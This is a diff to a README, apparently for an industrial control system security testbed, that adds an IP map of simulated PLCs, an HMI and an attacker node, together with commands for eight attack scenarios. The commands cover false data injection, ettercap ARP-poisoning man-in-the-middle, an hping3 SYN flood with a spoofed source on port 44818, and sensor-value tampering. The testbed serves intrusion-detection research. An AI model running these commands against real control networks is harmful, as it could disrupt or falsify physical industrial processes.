@@ -42,19 +42,31 @@ Collected dataset is stored as 'data.csv' in logs folder.
 Label the dataset using 'label.py' script.
 
 **Executing attacks**
+
 Note: Launch all attacks from attacker node terminal.
 
-1) Attack scenario 1 (False data injection): Run the following script to launch this attack for x minutes.
+IP to nodes mapping: PLC1 <--> 10.0.0.1, PLC2 <--> 10.0.0.2, PLC3 <--> 10.0.0.3, HMI <--> 10.0.0.4, ATTACKER <--> 10.0.0.5
+
+**Attack scenario 1** (False data injection): Run the following script to launch this attack for x minutes.
     ```
     python attack_fdi.py <x>
     ```
-2) Attack scenario 2, 3, 4 (MitM/DoS): Run the following commands for attacks 2, 3, 4 respectively.
-```
-ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// /10.0.0.2//
-ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// /10.0.0.3//
-ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// 
-```
-
+**Attack scenario 2, 3, 4** (MitM/DoS): Run the following commands for attacks 2, 3, 4 respectively.
+    ```
+    ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// /10.0.0.2//
+    ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// /10.0.0.3//
+    ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// 
+    ```
+**Attack scenario 5** (TCP SYN flooding)
+    ```
+    hping3 -S -a 10.0.0.4 --flood -V -p 44818 10.0.0.1
+    ```
+**Attack scenario 6,7,8** (MitM/Data tampering): Run the following commands for attacks 6, 7, 8 respectively.
+    ```
+    python attack_sensor_constant.py PLC2
+    python attack_sensor_constant.py PLC3
+    python attack_sensor_constant.py BOTH
+    ```
 
 Positive scaling by a constant scaling factor
 
